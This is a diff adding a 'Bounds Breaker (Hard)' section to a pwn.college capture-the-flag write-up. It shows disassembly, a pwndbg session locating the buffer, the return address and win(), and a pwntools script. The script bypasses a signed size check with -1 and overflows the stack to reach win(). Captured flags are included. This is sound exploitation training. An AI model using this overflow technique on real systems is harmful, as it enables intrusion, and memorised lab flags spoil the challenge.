@@ -1905,14 +1905,14 @@ In the above snippet, `jle` is used for signed comparison. As `-1 < 0x6a`, the c
 # --- snip ---
 ```
 
-As we saw before, `edx` holds the argument which specifies the number of bytes to be read. The problem is, number of bytes can never be negative, so `reads@plt` treats this argument as an unsigned integer. Thus `0xffffffffffffffff` is not interpreted as `-1` but rather as `18446744073709551615`.
+As we saw before, `edx` holds the argument which specifies the number of bytes to be read. The problem is, number of bytes can never be negative, so `read@plt` treats this argument as an unsigned integer. Thus `0xffffffffffffffff` is not interpreted as `-1` but rather as `18446744073709551615`.
 
 ```py
 In [1]: 0xffffffffffffffff
 Out[1]: 18446744073709551615
 ```
 
-As a result of this mismatch between how `jle` and `reads@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.
+As a result of this mismatch between how `jle` and `read@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.
 
 ### `win()`
 
@@ -2081,6 +2081,251 @@ Let's try it now!
 Goodbye!
 You win! Here is your flag:
 pwn.college{cqqx0Foh8TX0nmHtTa2208nl4Ry.0VN5IDL4ITM0EzW}
+
+
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## Bounds Breaker (Hard)
+
+```
+hacker@program-security~bounds-breaker-hard:~$ /challenge/bounds-breaker-hard 
+###
+### Welcome to /challenge/bounds-breaker-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+Goodbye!
+### Goodbye!
+```
+
+* [ ] Location of buffer
+* [ ] Location of stored return address to `main()`
+* [ ] Location of `win()`
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000004021b5 <+0>:     endbr64
+   0x00000000004021b9 <+4>:     push   rbp
+   0x00000000004021ba <+5>:     mov    rbp,rsp
+   0x00000000004021bd <+8>:     sub    rsp,0xa0
+   0x00000000004021c4 <+15>:    mov    DWORD PTR [rbp-0x84],edi
+   0x00000000004021ca <+21>:    mov    QWORD PTR [rbp-0x90],rsi
+   0x00000000004021d1 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
+   0x00000000004021d8 <+35>:    mov    QWORD PTR [rbp-0x70],0x0
+   0x00000000004021e0 <+43>:    mov    QWORD PTR [rbp-0x68],0x0
+   0x00000000004021e8 <+51>:    mov    QWORD PTR [rbp-0x60],0x0
+   0x00000000004021f0 <+59>:    mov    QWORD PTR [rbp-0x58],0x0
+   0x00000000004021f8 <+67>:    mov    QWORD PTR [rbp-0x50],0x0
+   0x0000000000402200 <+75>:    mov    QWORD PTR [rbp-0x48],0x0
+   0x0000000000402208 <+83>:    mov    QWORD PTR [rbp-0x40],0x0
+   0x0000000000402210 <+91>:    mov    QWORD PTR [rbp-0x38],0x0
+   0x0000000000402218 <+99>:    mov    QWORD PTR [rbp-0x30],0x0
+   0x0000000000402220 <+107>:   mov    QWORD PTR [rbp-0x28],0x0
+   0x0000000000402228 <+115>:   mov    QWORD PTR [rbp-0x20],0x0
+   0x0000000000402230 <+123>:   mov    QWORD PTR [rbp-0x18],0x0
+   0x0000000000402238 <+131>:   mov    DWORD PTR [rbp-0x10],0x0
+   0x000000000040223f <+138>:   lea    rax,[rbp-0x70]
+   0x0000000000402243 <+142>:   mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000402247 <+146>:   mov    DWORD PTR [rbp-0x74],0x0
+   0x000000000040224e <+153>:   lea    rdi,[rip+0xeb7]        # 0x40310c
+   0x0000000000402255 <+160>:   mov    eax,0x0
+   0x000000000040225a <+165>:   call   0x401130 <printf@plt>
+   0x000000000040225f <+170>:   lea    rax,[rbp-0x74]
+   0x0000000000402263 <+174>:   mov    rsi,rax
+   0x0000000000402266 <+177>:   lea    rdi,[rip+0xeae]        # 0x40311b
+   0x000000000040226d <+184>:   mov    eax,0x0
+   0x0000000000402272 <+189>:   call   0x401180 <__isoc99_scanf@plt>
+   0x0000000000402277 <+194>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x000000000040227a <+197>:   cmp    eax,0x64
+   0x000000000040227d <+200>:   jle    0x402295 <challenge+224>
+   0x000000000040227f <+202>:   lea    rdi,[rip+0xe98]        # 0x40311e
+   0x0000000000402286 <+209>:   call   0x401110 <puts@plt>
+   0x000000000040228b <+214>:   mov    edi,0x1
+   0x0000000000402290 <+219>:   call   0x401190 <exit@plt>
+   0x0000000000402295 <+224>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x0000000000402298 <+227>:   mov    esi,eax
+   0x000000000040229a <+229>:   lea    rdi,[rip+0xe9f]        # 0x403140
+   0x00000000004022a1 <+236>:   mov    eax,0x0
+   0x00000000004022a6 <+241>:   call   0x401130 <printf@plt>
+   0x00000000004022ab <+246>:   mov    eax,DWORD PTR [rbp-0x74]
+   0x00000000004022ae <+249>:   mov    edx,eax
+   0x00000000004022b0 <+251>:   mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000004022b4 <+255>:   mov    rsi,rax
+   0x00000000004022b7 <+258>:   mov    edi,0x0
+   0x00000000004022bc <+263>:   call   0x401150 <read@plt>
+   0x00000000004022c1 <+268>:   mov    DWORD PTR [rbp-0xc],eax
+   0x00000000004022c4 <+271>:   cmp    DWORD PTR [rbp-0xc],0x0
+   0x00000000004022c8 <+275>:   jns    0x4022f6 <challenge+321>
+   0x00000000004022ca <+277>:   call   0x401100 <__errno_location@plt>
+   0x00000000004022cf <+282>:   mov    eax,DWORD PTR [rax]
+   0x00000000004022d1 <+284>:   mov    edi,eax
+   0x00000000004022d3 <+286>:   call   0x4011a0 <strerror@plt>
+   0x00000000004022d8 <+291>:   mov    rsi,rax
+   0x00000000004022db <+294>:   lea    rdi,[rip+0xe86]        # 0x403168
+   0x00000000004022e2 <+301>:   mov    eax,0x0
+   0x00000000004022e7 <+306>:   call   0x401130 <printf@plt>
+   0x00000000004022ec <+311>:   mov    edi,0x1
+   0x00000000004022f1 <+316>:   call   0x401190 <exit@plt>
+   0x00000000004022f6 <+321>:   lea    rdi,[rip+0xe8f]        # 0x40318c
+   0x00000000004022fd <+328>:   call   0x401110 <puts@plt>
+   0x0000000000402302 <+333>:   mov    eax,0x0
+   0x0000000000402307 <+338>:   leave
+   0x0000000000402308 <+339>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+263` right before `read@plt` is called.
+
+```
+pwndbg> break *(challenge+263)
+Breakpoint 1 at 0x4022bc
+```
+
+```
+pwndbg> run
+Starting program: /challenge/bounds-breaker-hard 
+###
+### Welcome to /challenge/bounds-breaker-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x00000000004022bc in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────
+ RAX  0x7ffc2db73b70 ◂— 0
+ RBX  0x4023f0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  2
+ RDI  0
+ RSI  0x7ffc2db73b70 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x40315b ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x4011b0 (_start) ◂— endbr64 
+ R13  0x7ffc2db74d00 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffc2db73be0 —▸ 0x7ffc2db74c10 ◂— 0
+ RSP  0x7ffc2db73b40 ◂— 1
+ RIP  0x4022bc (challenge+263) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────
+ ► 0x4022bc <challenge+263>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffc2db73b70 ◂— 0
+        nbytes: 2
+ 
+   0x4022c1 <challenge+268>    mov    dword ptr [rbp - 0xc], eax
+   0x4022c4 <challenge+271>    cmp    dword ptr [rbp - 0xc], 0
+   0x4022c8 <challenge+275>    jns    challenge+321               <challenge+321>
+ 
+   0x4022ca <challenge+277>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x4022cf <challenge+282>    mov    eax, dword ptr [rax]
+   0x4022d1 <challenge+284>    mov    edi, eax
+   0x4022d3 <challenge+286>    call   strerror@plt                <strerror@plt>
+ 
+   0x4022d8 <challenge+291>    mov    rsi, rax
+   0x4022db <challenge+294>    lea    rdi, [rip + 0xe86]     RDI => 0x403168 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x4022e2 <challenge+301>    mov    eax, 0                 EAX => 0
+─────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffc2db73b40 ◂— 1
+01:0008│-098     0x7ffc2db73b48 —▸ 0x7ffc2db74d18 —▸ 0x7ffc2db7668b ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-090     0x7ffc2db73b50 —▸ 0x7ffc2db74d08 —▸ 0x7ffc2db7666c ◂— '/challenge/bounds-breaker-hard'
+03:0018│-088     0x7ffc2db73b58 ◂— 0x19c59d951
+04:0020│-080     0x7ffc2db73b60 ◂— 0xd68 /* 'h\r' */
+05:0028│-078     0x7ffc2db73b68 ◂— 0x20000000a /* '\n' */
+06:0030│ rax rsi 0x7ffc2db73b70 ◂— 0
+07:0038│-068     0x7ffc2db73b78 ◂— 0
+───────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4022bc challenge+263
+   1         0x4023cf main+198
+   2   0x7c6e9c531083 __libc_start_main+243
+   3         0x4011de _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+* [x] Location of buffer: `0x7ffc2db73b70`
+* [ ] Location of stored return address to `main()`
+* [ ] Location of `win()`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffc2db73bf0:
+ rip = 0x4022bc in challenge; saved rip = 0x4023cf
+ called by frame at 0x7ffc2db74c20
+ Arglist at 0x7ffc2db73be0, args: 
+ Locals at 0x7ffc2db73be0, Previous frame's sp is 0x7ffc2db73bf0
+ Saved registers:
+  rbp at 0x7ffc2db73be0, rip at 0x7ffc2db73be8
+```
+
+* [x] Location of buffer: `0x7ffc2db73b70`
+* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
+* [ ] Location of `win()`
+
+```
+pwndbg> info address win
+Symbol "win" is at 0x4020ae in a file compiled without debugging.
+```
+
+* [x] Location of buffer: `0x7ffc2db73b70`
+* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
+* [x] Location of `win()`: `0x4020ae`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/bounds-breaker-hard')
+
+# Initialize values
+buffer_addr = 0x7ffc2db73b70
+addr_of_stored_ip = 0x7ffc2db73be8
+win_func_addr = 0x4020ae
+
+# Calculate offset & payload_size
+offset = addr_of_stored_ip - buffer_addr
+payload_size = -1
+
+# Build payload
+payload = b"A" * offset
+payload += p64(win_func_addr)
+
+# Send number of bytes
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~bounds-breaker-hard:~$ python ~/script.py 
+[+] Starting local process '/challenge/bounds-breaker-hard': pid 21809
+/home/hacker/script.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(payload_size))
+[*] Switching to interactive mode
+ (up to -1 bytes)!
+[*] Process '/challenge/bounds-breaker-hard' stopped with exit code -11 (SIGSEGV) (pid 21809)
+Goodbye!
+You win! Here is your flag:
+pwn.college{c2QK8MySIcrTr1cBw5ue9GWyXo8.0lN5IDL4ITM0EzW}
 
 
 [*] Got EOF while reading in interactive
